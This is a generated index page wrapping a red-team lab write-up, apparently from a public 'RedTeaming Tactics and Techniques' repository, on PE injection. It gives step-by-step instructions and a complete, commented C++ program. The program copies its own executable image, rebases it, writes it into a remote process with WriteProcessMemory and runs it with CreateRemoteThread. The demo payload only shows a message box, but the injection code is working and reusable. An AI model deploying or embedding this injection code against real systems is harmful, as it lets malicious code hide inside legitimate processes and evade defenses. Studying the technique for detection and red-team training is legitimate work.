---
parsed_by: focuslocust
source: redteamingtactics
type: generated
---
# PE Injection: Executing PEs inside Remote Processes

[Home](../../../README.md)

## Provenance

| Field | Value |
| --- | --- |
| Source | `redteamingtactics` |
| Type | `redteaming-topic` |
| Record ID | `rtt-offensive-security-code-injection-process-injection-pe-injection-executing-pes-inside-remote-processes` |
| Source file | `/home/adams/scorchederf/focuslocust/.cache/redteaming-tactics-and-techniques/offensive-security/code-injection-process-injection/pe-injection-executing-pes-inside-remote-processes.md` |
| Parsed by | `focuslocust` |
| Relationship mode | `explicit / conservative inferred / manual` |

## Generated Concept Page

- [PE Injection: Executing PEs inside Remote Processes](../../topics/offensive-security/pe-injection-executing-pes-inside-remote-processes.md)

## Extracted Fields

| Field | Value |
| --- | --- |
| id | rtt-offensive-security-code-injection-process-injection-pe-injection-executing-pes-inside-remote-processes |
| name | PE Injection: Executing PEs inside Remote Processes |
| type | redteaming-topic |
| source | redteamingtactics |
| url | https://github.com/mantvydasb/RedTeaming-Tactics-and-Techniques/blob/master/offensive-security/code-injection-process-injection/pe-injection-executing-pes-inside-remote-processes.md |

## Preserved Source Material

````yaml
_asset_filenames:
- image (206).png
- image (207).png
- image (208).png
- image (209).png
- newthread.gif
- pe-injection.gif
_body: "---\ndescription: Code Injection\n---\n\n# PE Injection: Executing PEs inside Remote Processes\n\nThis is a quick\
  \ lab of a simplified way of injecting an entire portable executabe (PE) into another running process.\n\n{% hint style=\"\
  warning\" %}\nNote that in order to inject more complex PEs, additional DLLs in the target process may need to be loaded\
  \ and Import Address Table fixed and for this, refer to my other lab [Reflective DLL Injection](reflective-dll-injection.md#resolving-import-address-table).\n\
  {% endhint %}\n\n## Overview\n\nIn this lab, I wrote a simple C++ executable that self-injects its PE into a target process.\
  \ This executable contains 2 functions:\n\n* `main` - this is the function that performs the self-injection of the PE image\
  \ into a specified remote/target process, which is going to be `notepad.exe` in this case;\n* `InjectionEntryPoint` - this\
  \ is the function that will get executed by the target process (notepad) once notepads gets injected with our PE.&#x20;\n\
  \  * This function will pop a `MessageBox` with a name of the module the code is currently running from. If injection is\
  \ successful, it should spit out a path of notepad.exe.\n\n## Technique Overview\n\nInside the current process, that's doing\
  \ the self-injection of its PE:\n\n1. Get the image base address `imageBase`\n2. Parse the PE headers and get its `sizeOfImage`\n\
  3. Allocate a block of memory (size of PE image retrieved in step 1). Let's call it `localImage`\n4. Copy the image of the\
  \ current process into the newly allocated local memory `localImage`\n5. Allocate a new memory block (size of PE image retrieved\
  \ in step 1) in a remote process - the target process we want to inject the currently running PE into. Let's call it `targetImage`\n\
  6. Calculate the delta between memory addresses `targetImage` and `imageBase`, let's call it `deltaImageBase`&#x20;\n7.\
  \ Relocate/rebase the PE that's stored in `localImage` to `targetImage`. For more information about image relocations, see\
  \ my other lab [T1093: Process Hollowing and Portable Executable Relocations](process-hollowing-and-pe-image-relocations.md)\n\
  8. Write the patched PE into the `targetImage` memory location using `WriteProcessMemory`\n9. Create remote thread and point\
  \ it to `InjectionEntryPoint` function inside the PE target process\n\n## Walkthrough\n\nGetting `sizeOfImage` of the current\
  \ process (local process) that will be injecting itself into a target process and allocating a new memory block in the local\
  \ process:\n\n![](<../../.gitbook/assets/image (206).png>)\n\nIn my case, the new memory block got allocated at address\
  \ `0x000001813acc0000`. Let's copy the current process's image in there:\n\n![](<../../.gitbook/assets/image (207).png>)\n\
  \nLet's allocate a new block of memory in the target process. In my case it got allocated at `0x000001bfc0c20000`:\n\n![](<../../.gitbook/assets/image\
  \ (208).png>)\n\nCalculate the delta between `0x000001bfc0c20000` and `0x000001813acc0000` and perform [image base relocations](process-hollowing-and-pe-image-relocations.md#relocation).\
  \ Once that's done, we can move over our rebased PE from `0x000001813acc0000` to `0x000001bfc0c20000` in the remote process\
  \ using `WriteProcessMemory`.&#x20;\n\nBelow shows that our imaged has now been moved to the remote process:\n\n![](<../../.gitbook/assets/image\
  \ (209).png>)\n\nFinally, we can create a remote thread and point it to the `InjectionEntryPoint` function inside the remote\
  \ process:\n\n```cpp\nCreateRemoteThread(targetProcess, NULL, 0, (LPTHREAD_START_ROUTINE)((DWORD_PTR)InjectionEntryPoint\
  \ + deltaImageBase), NULL, 0, NULL);\n```\n\n![New thread getting created inside notepad.exe](../../.gitbook/assets/newthread.gif)\n\
  \n## Demo\n\nBelow shows how we've injected the PE into the notepad (PID 11068) and executed its function `InjectionEntryPoint`\
  \ which printed out the name of a module the code was running from, proving that the PE injection was succesful:\n\n![](../../.gitbook/assets/pe-injection.gif)\n\
  \n## Code\n\nBelow is the commented code that performs the PE injection:\n\n```cpp\n#include <stdio.h>\n#include <Windows.h>\n\
  \ntypedef struct BASE_RELOCATION_ENTRY {\n\tUSHORT Offset : 12;\n\tUSHORT Type : 4;\n} BASE_RELOCATION_ENTRY, * PBASE_RELOCATION_ENTRY;\n\
  \nDWORD InjectionEntryPoint()\n{\n\tCHAR moduleName[128] = \"\";\n\tGetModuleFileNameA(NULL, moduleName, sizeof(moduleName));\n\
  \tMessageBoxA(NULL, moduleName, \"Obligatory PE Injection\", NULL);\n\treturn 0;\n}\n\nint main()\n{\n\t// Get current image's\
  \ base address\n\tPVOID imageBase = GetModuleHandle(NULL);\n\tPIMAGE_DOS_HEADER dosHeader = (PIMAGE_DOS_HEADER)imageBase;\n\
  \tPIMAGE_NT_HEADERS ntHeader = (PIMAGE_NT_HEADERS)((DWORD_PTR)imageBase + dosHeader->e_lfanew);\n\n\t// Allocate a new memory\
  \ block and copy the current PE image to this new memory block\n\tPVOID localImage = VirtualAlloc(NULL, ntHeader->OptionalHeader.SizeOfImage,\
  \ MEM_COMMIT, PAGE_READWRITE);\n\tmemcpy(localImage, imageBase, ntHeader->OptionalHeader.SizeOfImage);\n\n\t// Open the\
  \ target process - this is process we will be injecting this PE into\n\tHANDLE targetProcess = OpenProcess(MAXIMUM_ALLOWED,\
  \ FALSE, 9304);\n\t\n\t// Allote a new memory block in the target process. This is where we will be injecting this PE\n\t\
  PVOID targetImage = VirtualAllocEx(targetProcess, NULL, ntHeader->OptionalHeader.SizeOfImage, MEM_COMMIT, PAGE_EXECUTE_READWRITE);\n\
  \n\t// Calculate delta between addresses of where the image will be located in the target process and where it's located\
  \ currently\n\tDWORD_PTR deltaImageBase = (DWORD_PTR)targetImage - (DWORD_PTR)imageBase;\n\n\t// Relocate localImage, to\
  \ ensure that it will have correct addresses once its in the target process\n\tPIMAGE_BASE_RELOCATION relocationTable =\
  \ (PIMAGE_BASE_RELOCATION)((DWORD_PTR)localImage + ntHeader->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_BASERELOC].VirtualAddress);\n\
  \tDWORD relocationEntriesCount = 0;\n\tPDWORD_PTR patchedAddress;\n\tPBASE_RELOCATION_ENTRY relocationRVA = NULL;\n\n\t\
  while (relocationTable->SizeOfBlock > 0)\n\t{\n\t\trelocationEntriesCount = (relocationTable->SizeOfBlock - sizeof(IMAGE_BASE_RELOCATION))\
  \ / sizeof(USHORT);\n\t\trelocationRVA = (PBASE_RELOCATION_ENTRY)(relocationTable + 1);\n\n\t\tfor (short i = 0; i < relocationEntriesCount;\
  \ i++)\n\t\t{\n\t\t\tif (relocationRVA[i].Offset)\n\t\t\t{\n\t\t\t\tpatchedAddress = (PDWORD_PTR)((DWORD_PTR)localImage\
  \ + relocationTable->VirtualAddress + relocationRVA[i].Offset);\n\t\t\t\t*patchedAddress += deltaImageBase;\n\t\t\t}\n\t\
  \t}\n\t\trelocationTable = (PIMAGE_BASE_RELOCATION)((DWORD_PTR)relocationTable + relocationTable->SizeOfBlock);\n\t}\n\n\
  \t// Write the relocated localImage into the target process\n\tWriteProcessMemory(targetProcess, targetImage, localImage,\
  \ ntHeader->OptionalHeader.SizeOfImage, NULL);\n\n\t// Start the injected PE inside the target process\n\tCreateRemoteThread(targetProcess,\
  \ NULL, 0, (LPTHREAD_START_ROUTINE)((DWORD_PTR)InjectionEntryPoint + deltaImageBase), NULL, 0, NULL);\n\n\treturn 0;\n}\n\
  ```\n\n## References\n\n{% embed url=\"https://www.andreafortuna.org/2018/09/24/some-thoughts-about-pe-injection/\" %}\n\
  \n{% embed url=\"https://blog.sevagas.com/PE-injection-explained\" %}\n\n{% embed url=\"https://www.malwaretech.com/2013/11/portable-executable-injection-for.html\"\
  \ %}"
_relative_path: offensive-security/code-injection-process-injection/pe-injection-executing-pes-inside-remote-processes.md
_source_path: /home/adams/scorchederf/focuslocust/.cache/redteaming-tactics-and-techniques/offensive-security/code-injection-process-injection/pe-injection-executing-pes-inside-remote-processes.md
````
